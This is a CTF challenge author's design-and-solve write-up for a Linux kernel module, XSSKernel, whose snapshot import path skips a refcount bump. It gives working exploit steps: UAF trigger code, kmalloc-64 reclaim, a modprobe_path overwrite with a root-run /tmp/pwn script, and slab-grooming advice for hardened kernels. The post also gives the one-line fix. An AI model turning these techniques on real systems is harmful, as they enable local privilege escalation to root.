---
title: "The Probability of Root: Designing a Kernel UAF"
date: 2026-06-10
description: "A refcount bug hidden in a cross-fd snapshot driver...from driver design to root shell."
tags:
  - ctf
  - kernel-exploit
  - linux
  - uaf
  - heap
  - pwn
image: /images/xsskernel/berserk.jpg
---

## Introduction

So I made a challenge for Thcon this year and I wanted to write about it, not just a boring "here's the solve" but actually share the thought process behind the design. Because honestly, designing a kernel challenge is more fun than solving one sometimes. You get to decide *where* to hide the needle.

The challenge is called **XSSKernel**. Yeah, that name is intentionally confusing. There's no web XSS. It's a Linux kernel module, the name came from the Lore Story of the CTF, as XSS is a gang of hackers :D...

The goal: pop root, read `/flag`.

This post is both the design story and the solve writeup. Let's go.


## What the Driver Does

The module creates a character device at `/dev/xsskernel`. Each `open()` gives you a **bank**, an isolated set of 8 memory slots, each 4096 bytes. You interact with it through ioctls:

| IOCTL | What it does |
|-------|-------------|
| `XSS_IOCTL_WRITE` | Write user data into a slot (CoW-safe by default) |
| `XSS_IOCTL_READ` | Read a slot back to userspace |
| `XSS_IOCTL_SNAPSHOT` | Save current state of all 8 slots into a named snapshot |
| `XSS_IOCTL_RESTORE` | Restore a named snapshot back into the live slots |
| `XSS_IOCTL_DELETE` | Delete a named snapshot |
| `XSS_IOCTL_EXPORT` | Export a snapshot as a numeric token (cross-fd shareable) |
| `XSS_IOCTL_IMPORT` | Import a token from another fd into this bank |
| `XSS_IOCTL_VERIFY` | `memcmp` two live slots, returns 1 if identical |
| `XSS_IOCTL_LABEL` | Attach a short tag string to a slot |

The interesting part is the **cross-fd export/import**. You can snapshot your bank, export it as a u64 token, then import that token from a *different* fd and get a copy of the snapshot in your bank. The token is a global handle, valid across file descriptors and processes.


## The Core Structures

The whole driver revolves around three structures. Understanding them is understanding the bug.

```c
struct xss_page {
    void     *data;       // the 4096-byte payload buffer
    atomic_t  refs;       // refcount
    u32       magic;      // 0x58535350 ('XSSP')
    u64       generation;
    char      tag[40];    // cosmetic label
};

struct xss_snapshot {
    char              name[XSS_NAME_LEN];  // 32 bytes
    struct xss_page  *slots[XSS_SLOTS];    // 8 page pointers
    atomic_t          refs;
    struct list_head  list_in_bank;
};

struct xss_bank {
    struct xss_page  *current_slots[XSS_SLOTS];
    struct list_head  snapshots;
    struct mutex      lock;
    u64               generation;
};
```

One thing to note right away: `xss_page` is exactly **64 bytes** (8+4+4+8+40). That puts it squarely in `kmalloc-64`. This matters for slab reclaim later.

The lifecycle is straightforward. Pages start with `refs = 1`. `xss_page_get()` bumps the refcount and `xss_page_put()` decrements it, freeing the page when it hits zero:

```c
static void xss_page_put(struct xss_page *p)
{
    if (atomic_dec_and_test(&p->refs)) {
        kfree(p->data);
        kfree(p);
    }
}
```

When you take a snapshot, each current slot gets a `xss_page_get()` call, so the page is now shared between the live bank and the snapshot. When you write to a shared slot, the driver detects `refs > 1` and copies the page first (Copy-on-Write):

```c
if (!(io->flags & XSS_WRITE_FAST) && atomic_read(&cur->refs) != 1) {
    np = xss_page_alloc(++b->generation);
    memcpy(np->data, cur->data, XSS_PAGE_SIZE);
    b->current_slots[io->slot] = np;
    xss_page_put(cur);
    cur = np;
}
```

Looks solid. The bug is not here.


## The Bug

Look at how `xss_op_snapshot` stores pages into a new snapshot:

```c
for (i = 0; i < XSS_SLOTS; i++)
    s->slots[i] = xss_page_get(b->current_slots[i]);  // bumps refs
```

Each page gets a proper `xss_page_get()`. Good.

Now look at `xss_op_import`:

```c
/* token holds a struct ref on src; slot pointers are valid. */
for (i = 0; i < XSS_SLOTS; i++)
    new_s->slots[i] = src->slots[i];   // NO xss_page_get
```

No `xss_page_get()`. The comment even tries to justify it: "the token holds a struct ref on src, so the slot pointers are valid." That's technically true. The `xss_snapshot` struct `src` stays alive because the token incremented its refcount. But the *pages* inside `src->slots` have no idea that `new_s` now holds pointers to them. Their refcounts were never bumped.

So `new_s` holds pointers to pages it doesn't own. One missing function call. That's the whole bug.

I designed this to look completely reasonable at a glance. The comment even provides cover. That's the game.


## Refcount Walkthrough

Let's trace exactly what happens with slot 0 through the exploit setup.

**Initial state after `open()`:**

```
page0 allocated, page0.refs = 1
current_slots[0] = page0
```

**After `SNAPSHOT "A"`:**

```
snap_A.slots[0] = xss_page_get(page0)
page0.refs = 2   (current_slots[0] + snap_A.slots[0])
snap_A.refs = 1  (bank list holds it)
```

**After `EXPORT "A"` to get token T:**

```
atomic_inc(&snap_A.refs)
snap_A.refs = 2  (bank list + token)
page0.refs = 2   (unchanged, export only bumps the snapshot struct ref)
```

**After `IMPORT T as "B"`:**

```
new_s->slots[0] = src->slots[0]   // no xss_page_get!
snap_B.slots[0] = page0
page0.refs = 2   (still 2, import never called xss_page_get)
snap_B.refs = 1  (bank list holds it)
```

**After `DELETE "A"`:**

```
snap_detach_from_bank_locked(snap_A):
  xss_page_put(page0) -> page0.refs: 2 -> 1
  snap_drop_struct(snap_A): snap_A.refs: 2 -> 1  (token still holds it)
```

**After `DELETE "B"`:**

```
snap_detach_from_bank_locked(snap_B):
  xss_page_put(page0) -> page0.refs: 1 -> 0 -> PAGE FREED
    kfree(page0->data)
    kfree(page0)
```

And `current_slots[0]` still points to the freed `page0`. **Use-After-Free.**

The root cause in one sentence: `snap_B` held a dangling pointer to a page it never owned, and when it got destroyed it drove the refcount to zero and freed memory that was still reachable.


## Primitives From the UAF

Once `page0` is freed and `current_slots[0]` is dangling, every ioctl that touches slot 0 goes through freed memory.

**Write through UAF:**

```c
cur = b->current_slots[io->slot];   // dangling ptr to freed page0
copy_from_user(cur->data + io->offset, uptr, io->len);
```

`cur->data` is whatever byte 0 through 7 of the freed `xss_page` struct contain now. If the slab recycled that memory for something else, `cur->data` is whatever that new object placed at offset 0. Writing with `XSS_WRITE_FAST` skips the refcount check entirely and goes straight to `copy_from_user`, so we write to wherever `cur->data` points.

**Read through UAF:**

Same path but with `copy_to_user`. If we know what recycled the slab, we can leak its contents.

**Verify as oracle:**

`xss_op_verify` does `memcmp(pa->data, pb->data, ...)`. One of the pointers can be a dangling UAF pointer. Useful for checking heap state without a full read.


## Full Exploit Path

### Step 1: Trigger the UAF

```c
int fd = open("/dev/xsskernel", O_RDWR);

struct xss_io io = { .slot=0, .offset=0, .len=8, .buf=(u64)"AAAAAAAA" };
ioctl(fd, XSS_IOCTL_WRITE, &io);

struct xss_name nm_A = { .name="A" };
ioctl(fd, XSS_IOCTL_SNAPSHOT, &nm_A);

struct xss_export ex = { .name="A" };
ioctl(fd, XSS_IOCTL_EXPORT, &ex);
u64 token = ex.token;

struct xss_import im = { .token=token, .name="B" };
ioctl(fd, XSS_IOCTL_IMPORT, &im);

// delete both: page0 hits zero, current_slots[0] is now dangling
ioctl(fd, XSS_IOCTL_DELETE, &(struct xss_name){ .name="A" });
ioctl(fd, XSS_IOCTL_DELETE, &(struct xss_name){ .name="B" });
```

At this point `current_slots[0]` on `fd` is a dangling pointer to freed `kmalloc-64` memory.

### Step 2: Reclaim the Freed Slab

`xss_page` is 64 bytes so it goes to `kmalloc-64`. We open a fresh fd and write to its slot 0, which calls `xss_page_alloc`. The SLUB allocator is LIFO-ish for the per-CPU freelist, so the just-freed chunk comes back almost immediately.

For the actual exploit we want to plant a fake `xss_page` struct in that freed chunk with `data` pointing to a kernel target. Since `data` is at offset 0 of the struct, we write an 8-byte kernel address at offset 0 of our fresh slot, and SLUB hands us back that chunk as the recycled `page0` on our original fd.

### Step 3: Leak Kernel Addresses

The challenge has `kptr_restrict=0`, so `/proc/kallsyms` is readable. We grab `modprobe_path` directly:

```c
FILE *f = fopen("/proc/kallsyms", "r");
unsigned long addr;
char sym[256];
while (fscanf(f, "%lx %*c %255s", &addr, sym) == 2) {
    if (!strcmp(sym, "modprobe_path")) {
        modprobe_path_addr = addr;
        break;
    }
}
```

No KASLR bypass needed when the symbol table is open.

### Step 4: Corrupt modprobe_path

With our fake `xss_page.data` pointing at `modprobe_path`, we issue a `XSS_WRITE_FAST` write on slot 0 of the original fd:

```c
char path[] = "/tmp/pwn";
struct xss_io io = {
    .slot   = 0,
    .offset = 0,
    .len    = sizeof(path),
    .flags  = XSS_WRITE_FAST,
    .buf    = (u64)path,
};
ioctl(fd, XSS_IOCTL_WRITE, &io);
// becomes: copy_from_user(modprobe_path, "/tmp/pwn", 9)
```

One ioctl. `modprobe_path` now points at our script.

### Step 5: Trigger modprobe

```c
// /tmp/pwn contains:
//   #!/bin/sh
//   cp /flag /tmp/flag && chmod 777 /tmp/flag

int f = open("/tmp/dummy", O_CREAT|O_WRONLY, 0777);
write(f, "\xff\xff\xff\xff", 4);
close(f);
execve("/tmp/dummy", NULL, NULL);
// kernel calls /tmp/pwn as root
```

Flag is at `/tmp/flag`.


## The Math Behind Spray Probability

The spray step feels intuitive: free a chunk, allocate a chunk of the same size, get the old chunk back. But the probability of success is not always 1, and understanding why matters when your exploit fails in practice.

The modeling approach below is inspired by the paper [**"Take a Step Further: Understanding Page Spray in Linux Kernel Exploitation"**](https://arxiv.org/html/2406.02624v1) which is genuinely one of the best formal treatments of heap spray mechanics I've come across. Worth reading in full.

The SLUB allocator manages `kmalloc-64` as a per-CPU LIFO freelist. After `kfree(page0)`, target chunk $T$ sits at the top. In a single-threaded world we get it back immediately. The world is not single-threaded. Tragically.

Between our `kfree` and our spray, there is a race window $\tau$ where competing threads allocate from the same cache. We model those as a **Poisson process** ([Poisson distribution](https://en.wikipedia.org/wiki/Poisson_distribution)) with rate $\lambda$:

$$P(\text{reclaim, no spray}) = e^{-\lambda\tau}$$

If an ioctl gets preempted and $\tau$ stretches to $100\ \mu s$ on a moderately loaded system ($\lambda = 10^4$/s), then $\lambda\tau = 1$ and $P \approx 0.368$. Congratulations, your exploit is now a coinflip with extra steps.

Spraying $S$ consecutive chunks fixes this. We succeed when fewer than $S$ competing allocations buried $T$. Using the Poisson CDF ([Incomplete gamma function](https://en.wikipedia.org/wiki/Incomplete_gamma_function)):

$$P(\text{success} \mid S) = \frac{\Gamma(S,\, \lambda\tau)}{\Gamma(S)}$$

To pick $S$ for a target failure rate $\varepsilon$, the **Chernoff bound** ([Chernoff bound](https://en.wikipedia.org/wiki/Chernoff_bound)) gives:

$$P\!\left(\mathrm{Poisson}(\mu) \geq S\right) \leq e^{-\mu}\!\left(\frac{e\mu}{S}\right)^{\!S}, \qquad \mu = \lambda\tau$$

| $\mu$ | $S$ for $\varepsilon < 10^{-2}$ | $S$ for $\varepsilon < 10^{-3}$ |
|:---:|:---:|:---:|
| 1 | 7 | 9 |
| 5 | 13 | 15 |
| 10 | 21 | 24 |

When competing threads also *free* during the window, $T$'s position drifts by $N_a - N_f$, which follows the **Skellam distribution** ([Skellam distribution](https://en.wikipedia.org/wiki/Skellam_distribution)) with variance $2\lambda\tau$ (yes, Skellam is a real name, yes this is a real distribution). Production exploits spray 64 or more chunks because that variance grows linearly with load.

With 2 fresh fds (16 chunks) on this driver under a CTF load $\mu \leq 2$:

$$P(\text{success}) = P\!\left(\mathrm{Poisson}(2) < 16\right) \approx 1 - 3.5 \times 10^{-7}$$

Seven nines. If your exploit still fails with those odds, I genuinely cannot help you, that's a you problem.


## Toward Deterministic Spray: Attacking the Sources of Entropy

Increasing $S$ is the lazy answer. It works, but you're just throwing chunks at the problem and hoping. The interesting question is: can we *engineer* the heap state so that the spray succeeds with probability 1, regardless of load?

Yes. The answer involves attacking each source of entropy separately. There are three: the race window $\tau$, the competing rate $\lambda$, and the freelist depth $F$ under $T$. Kill all three and the spray becomes deterministic.

### Source 1: The Race Window, Shrinking $\tau$ to Near Zero

The race window exists because there are instructions between our `kfree` and our controlled `kmalloc`. Every instruction is a preemption point. Every page fault in that path adds microseconds.

**`mlockall(MCL_CURRENT | MCL_FUTURE)`** before the exploit run locks all pages into physical memory. This eliminates soft page faults from the critical path. The kernel will not page-fault inside your exploit's hot loop.

**`madvise(MADV_POPULATE_WRITE, ...)`** on your spray buffers pre-faults the userspace pages you will write controlled data into. No fault on first touch during the spray.

**Avoid syscall overhead in the critical window.** The sequence `kfree → kmalloc` in userspace is actually two ioctl syscalls. Each has entry/exit overhead of ~100–300 ns. Pre-build all the ioctl argument structs in a local array so the spray loop does nothing except syscall:

```c
// pre-built, cache-hot
struct xss_io ios[SPRAY_N];  // built before triggering the UAF
// critical window:
ioctl(fd, XSS_IOCTL_DELETE, &nm_A);  // kfree happens here
ioctl(fd, XSS_IOCTL_DELETE, &nm_B);  // UAF triggered
for (int i = 0; i < SPRAY_N; i++)
    ioctl(spray_fds[i], XSS_IOCTL_WRITE, &ios[i]);  // spray
```

With everything pre-faulted and cache-warm, the effective $\tau$ between the last `kfree` and the first spray `kmalloc` is in the tens of nanoseconds. At $\lambda = 10^4$/s:

$$\lambda\tau = 10^4 \times 50 \times 10^{-9} = 5 \times 10^{-4}$$

$$P(\text{no competition}) = e^{-5 \times 10^{-4}} \approx 0.9995$$

The spray is nearly redundant at this point. But we still do it, because "nearly" is not "exactly."

### Source 2: Competing Rate, Reducing $\lambda$ via CPU Pinning

SLUB maintains **one freelist per CPU**. Threads on CPU 0 cannot touch the freelist of CPU 1. This is the key insight.

`sched_setaffinity()` pins your process to a single CPU:

```c
cpu_set_t mask;
CPU_ZERO(&mask);
CPU_SET(target_cpu, &mask);
sched_setaffinity(0, sizeof(mask), &mask);
```

Now only threads scheduled on the same CPU compete for your freelist. If the system has $C$ physical CPUs and the load is balanced, the effective competing rate drops from $\lambda$ to $\lambda / C$.

On a 4-core machine: $\lambda_{\text{eff}} = \lambda / 4$. On an 8-core machine: $\lambda / 8$.

Better: if you know which CPU has the lightest load (readable from `/proc/stat`), pin there. Kernel background threads like kworkers are not uniformly distributed. CPU 0 typically runs more system work; higher-numbered CPUs are often quieter on desktop systems.

The full model with CPU pinning becomes:

$$\mu_{\text{eff}} = \frac{\lambda}{C} \cdot \tau$$

Combining with the $\tau$-minimization from above, on an 8-core system with $\tau = 50\ \text{ns}$:

$$\mu_{\text{eff}} = \frac{10^4}{8} \times 50 \times 10^{-9} \approx 6 \times 10^{-5}$$

$$P(\text{no competition}) \approx 1 - 6 \times 10^{-5}$$

At this point a spray of $S = 2$ is already $P > 0.9999$.

### Source 3: Freelist Depth, Grooming to $F = 1$

Even with $\tau$ and $\lambda$ under control, we're still at the mercy of $F$: the number of free chunks in the per-CPU freelist when the UAF triggers. If other threads freed a lot of `kmalloc-64` objects recently, $T$ might not even be at position 1.

The solution is **slab grooming**: arrange the heap so that when we do `kfree(page0)`, $T$ ends up as the *only* free object on its slab page.

SLUB organizes objects in slab pages (typically 4 KB or 8 KB pages housing multiple objects). Each slab page has a fixed number of slots. For `kmalloc-64` on x86-64, a single slab page holds 64 objects (4096 / 64 = 64 slots, minus a small header).

**The grooming algorithm:**

```
Step 1. Exhaust the per-CPU freelist.
        Allocate kmalloc-64 objects in a tight loop until you notice
        SLUB has to fetch a new slab page from the partial list.
        Concretely: open many fds, each forces 8 xss_page allocations.
        Stop when a fresh slab page is pulled in.

Step 2. Fill all but one slot on that fresh slab page.
        Allocate 63 more xss_page objects (63/64 slots filled).
        The page now has exactly 1 free slot.

Step 3. Trigger the UAF.
        kfree(page0) places T into that 1 free slot.
        The slab page now transitions from "partial (1 free)" to
        "partial (1 free after our kfree added it back)"...
        but since no other slot is free, T IS the only choice.

Step 4. Spray.
        The next kmalloc-64 *must* return T.
        There is nothing else on that slab page to return.
```

The math here is trivial because we engineered away the randomness. The freelist of that slab page has $F = 1$. The probability of getting $T$ is:

$$P(\text{success} \mid F=1) = 1$$

No spray needed. No Poisson. No Chernoff bound. Just one allocation and it's $T$.

The catch: Step 1 and Step 2 require knowing how many objects are already in the per-CPU freelist and on the current slab page. You can estimate this with a timing oracle (measuring `kmalloc` latency spikes that indicate slab page transitions), or you can simply over-allocate and then free a predictable number back. Over-allocating is the practical approach for a CTF.

### The Full Model with All Three Combined

With $\tau$ minimized, $\lambda$ reduced by CPU pinning, and $F = 1$ via grooming:

The position of $T$ in the freelist is deterministically 1 (the only slot). Even if a competing allocation fires during the window:

- If it hits our slab page: it takes $T$. We fail for this attempt.
- But with $\mu_{\text{eff}} \approx 6 \times 10^{-5}$, the probability of even one competing hit is negligible.

The **information-theoretic view**: spray success is uncertain because we do not know where $T$ landed in the freelist. Each technique reduces the *entropy* of $T$'s position. Grooming to $F = 1$ reduces it to zero bits. At zero entropy, no spray is needed at all.

$$H(\mathrm{pos}(T)) = -\sum_{k} P(\mathrm{pos}(T) = k) \log_2 P(\mathrm{pos}(T) = k)$$

- No grooming, $\mu = 1$: $H \approx 1.5$ bits of uncertainty.
- CPU pinning only: $H \approx 0.8$ bits.
- Grooming only ($F = 1$): $H = 0$ bits (deterministic).
- All three combined: $H = 0$ bits, and the tiny residual race probability approaches $\mu_{\text{eff}} \approx 10^{-5}$.

### What About `CONFIG_SLAB_FREELIST_RANDOM`?

This kernel config (enabled on hardened kernels, Android, Ubuntu 22.04+) randomizes the freelist order within each slab page. Instead of LIFO, the order is shuffled at slab page initialization time.

With randomization: $T$'s position is uniform over $[1, F]$, so $P(\text{success} \mid S) = \min(S/F, 1)$. To hit $T$ reliably you now need $S \approx F$, which for `kmalloc-64` means spraying all 64 slots. That is a lot of chunks.

The grooming approach kills this mitigation entirely. If $F = 1$, the freelist has one element, randomization does nothing, and $T$ is still the only possible return value. Grooming is not just an optimization, on hardened kernels it is the only reliable path.

This is also why `CONFIG_SLAB_FREELIST_RANDOM` was *not* a blocker for this challenge even if it had been enabled: the per-fd allocation pattern (8 `xss_page` allocs per open) makes it straightforward to groom the slab into a deterministic state before pulling the trigger.


## Unintended Paths and What They Reveal

This section is the more interesting one for me. When you design a challenge, people find paths you never thought of, and those paths are usually more educational than the intended one. Here are the ones I had in mind while building the hardening, plus some I discovered after.

### Double Free via Multiple Imports

The import path does not prevent you from importing the same token twice. Import token T as both "B" and "C" and both snapshots now hold pointers to `page0` without bumping its refcount. The accounting then becomes:

```
page0.refs = 2  (current_slots[0] + snap_A)
import T as B -> page0.refs = 2  (no bump)
import T as C -> page0.refs = 2  (no bump)

delete A -> page0.refs: 2 -> 1
delete B -> page0.refs: 1 -> 0 -> kfree(page0->data), kfree(page0)
delete C -> page0.refs: 0 -> -1 -> kfree on already-freed memory
```

That is a **double free**. In SLUB, double-freeing a chunk corrupts the freelist. A controlled double free can give you a chunk at an arbitrary address if you can manipulate the freelist state. This is arguably a stronger primitive than the intended path, and it came entirely out of the same missing `xss_page_get`.

### kmalloc-64 Spray Without the Usual Tools

The usual way to spray `kmalloc-64` from userspace is through `SOCK_DIAG` or `AF_ALG` sockets, both of which go through `CONFIG_CRYPTO_USER_API`. I disabled those in the kernel config for exactly this reason and left a troll message in the log for anyone who tries. But `kmalloc-64` is everywhere in the kernel.

**Open more /dev/xsskernel fds.** Each `open()` allocates 8 `xss_page` structs in `kmalloc-64`. Open 16 fresh fds and you spray 128 chunks. You can write controlled data into them through their slot 0. This is the cleanest approach and it keeps you entirely within the driver's own API.

**Pipe buffers.** `struct pipe_buffer` is 40 bytes, so it lands in `kmalloc-64`. Create a large number of pipes and write one byte to each to force the allocation. Reading from the pipe frees it, giving you controlled release timing.

**setxattr.** On most kernels, `setxattr` with a 64-byte value allocates a `kmalloc-64` chunk for the value buffer. The allocation is ephemeral but with timing control you can use it for race-based attacks. Not useful here without a race, but worth knowing.

The key insight is that `kmalloc-64` is a shared pool. Anything that allocates a 33 to 64 byte struct ends up there. Finding the right object is about knowing your kernel data structures and their sizes.

### XSS_WRITE_FAST as a Standalone Angle

The `XSS_WRITE_FAST` flag was designed as a performance optimization: it skips the CoW check and writes directly into a slot even if that slot is shared. The comment in the code says "caller asserts the slot is private." In a CTF challenge, "caller asserts" is a red flag.

Even without the UAF you can abuse this. After a snapshot is taken, `current_slots[0]` and `snap.slots[0]` both point to the same `xss_page` with `refs = 2`. A FAST write goes straight to `copy_from_user(cur->data + offset, ...)` with no refcount check, corrupting the snapshot in place.

On its own that is just data corruption inside the driver. But combined with the UAF, FAST write is what makes the exploit work: the UAF gives you a dangling pointer to a recycled chunk, and FAST write lets you use that pointer without triggering the CoW branch that would swap out the slot.

### The Read Primitive as an Information Leak

After the UAF and before spray, `current_slots[0]` points to a freed `kmalloc-64` chunk. If SLUB has already handed that chunk to something else, reading through slot 0 with `XSS_IOCTL_READ` copies the contents of that new object to userspace.

In environments where `kptr_restrict=1`, this is how you do your kernel pointer leak: trigger the UAF, wait for the slab to be recycled by an object containing a kernel address (a linked list pointer, a function pointer, anything), read slot 0, extract the address. I set `kptr_restrict=0` to make the challenge accessible, but against a production kernel this read primitive is the first thing you reach for.

### The Verify Oracle

`xss_op_verify` compares two slots byte by byte with `memcmp`. One of those slots can be the UAF slot. This lets you probe heap state without leaking data to userspace: compare the UAF slot against a slot with known content and you get a yes/no answer about a specific byte.

Not useful when you have the read primitive, but in a more restricted environment where `XSS_IOCTL_READ` were gated behind a check, the verify oracle lets you do a byte by byte leak with 256 comparisons per byte. Slow but it works, and it is a fun technique.


## The Fix

One line:

```c
// in xss_op_import, change:
new_s->slots[i] = src->slots[i];
// to:
new_s->slots[i] = xss_page_get(src->slots[i]);
```

That is it. `xss_page_get` bumps the refcount so the imported snapshot actually owns its page references. The UAF, the double free, all of it disappears with 16 extra characters.

The bug class is inspired by a real driver vulnerability I ran across during source review work. Same primitive, different surface. Refcount bugs in kernel drivers that share objects across file descriptor boundaries are genuinely underexplored. Most reviewers check write and ioctl paths for bounds violations and miss the lifecycle edges entirely.


## Conclusion

Designing a kernel challenge is basically writing a tiny OS component with an intentional lifecycle bug hidden inside normal-looking code. The exploit path is: find the missing refcount bump, cause a use-after-free, reclaim the freed slab with controlled content, corrupt a kernel pointer, arbitrary write, root.

The real skill tested here is not "can you exploit a UAF." That is a known technique with a known playbook. The skill is "can you read 500 lines of driver code and find the one place where a ref is not bumped." Everything else follows from that.

But the more I think about it, the more I appreciate the unintended paths. The double free from multiple imports is a cleaner primitive. The read oracle approach teaches you how UAF leaks work in restricted environments. The FAST write flag is a footgun that deserves its own writeup someday.

Thanks to the Thcon crew for running the infra. Hope people had fun or were properly frustrated.

0x3lk
